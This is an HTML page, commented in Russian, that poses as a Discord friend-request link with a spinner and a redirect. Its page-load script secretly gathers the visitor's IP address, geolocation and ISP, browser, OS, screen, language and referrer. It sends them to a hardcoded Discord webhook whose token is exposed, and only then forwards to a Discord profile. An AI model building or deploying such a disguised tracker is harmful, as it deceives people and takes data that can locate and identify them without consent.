<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Добавь в друзья Discord">
    <meta property="og:description" content="Нажми чтобы добавить в друзья">
    <meta property="og:image" content="https://cdn.discordapp.com/avatars/1473020726280847541/ТВОЙ_AVATAR_HASH.png?size=256">
    <meta name="theme-color" content="#5865F2">
    <title>Friend Request - Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #5865F2, #404EED);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            text-align: center;
        }
        .container {
            animation: fadeIn 0.5s ease;
        }
        .avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 5px solid white;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h2 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: rgba(255,255,255,0.8);
            font-size: 16px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="avatar" 
             src="https://cdn.discordapp.com/avatars/1473020726280847541/ТВОЙ_AVATAR_HASH.png?size=256" 
             alt="Avatar"
             onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
        <h2>👋 Привет!</h2>
        <p>Перенаправляем в Discord...</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function trackAndRedirect() {
            try {
                // Собираем данные посетителя
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                
                // Дополнительная геолокация
                let geoInfo = '';
                try {
                    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,isp`);
                    const geo = await geoResponse.json();
                    geoInfo = `🌍 ${geo.city}, ${geo.country}\n📡 ${geo.isp}`;
                } catch(e) {
                    geoInfo = '🌍 Гео не определена';
                }

                const visitorData = {
                    ip: ip,
                    geo: geoInfo,
                    browser: navigator.userAgent.split(')').pop().split(' ')[1] || 'Неизвестно',
                    os: navigator.platform || 'Неизвестно',
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    time: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
                    referrer: document.referrer || 'Прямой переход'
                };

                // Твой вебхук
                const webhookURL = "https://discord.com/api/webhooks/1507909831678496848/6Hm-yFjHzRHElN-GRxDYMc5o3ILiiis_tdMu4GfTiwnScyQCFio5lHr5ou29Y2jVWCgF";
                
                // Отправляем в Discord
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "👀 Новый посетитель!",
                            color: 5814786,
                            fields: [
                                {
                                    name: "🕐 Время",
                                    value: visitorData.time,
                                    inline: true
                                },
                                {
                                    name: "🌐 IP",
                                    value: `||${visitorData.ip}||`,
                                    inline: true
                                },
                                {
                                    name: "📍 Локация",
                                    value: visitorData.geo,
                                    inline: false
                                },
                                {
                                    name: "🖥️ Браузер",
                                    value: visitorData.browser,
                                    inline: true
                                },
                                {
                                    name: "💻 ОС",
                                    value: visitorData.os,
                                    inline: true
                                },
                                {
                                    name: "📱 Экран",
                                    value: visitorData.screen,
                                    inline: true
                                },
                                {
                                    name: "🌍 Язык",
                                    value: visitorData.language,
                                    inline: true
                                },
                                {
                                    name: "🔗 Источник",
                                    value: visitorData.referrer,
                                    inline: false
                                }
                            ],
                            footer: {
                                text: "Discord Friend Tracker • " + new Date().toISOString()
                            }
                        }]
                    })
                });
                
                console.log('✅ Данные отправлены в Discord!');
            } catch(error) {
                console.log('⚠️ Ошибка:', error);
            }
            
            // Редирект в Discord
            setTimeout(() => {
                window.location.href = "https://discord.com/users/1473020726280847541";
            }, 2000);
        }

        // Запускаем при загрузке
        trackAndRedirect();
    </script>
</body>
</html>
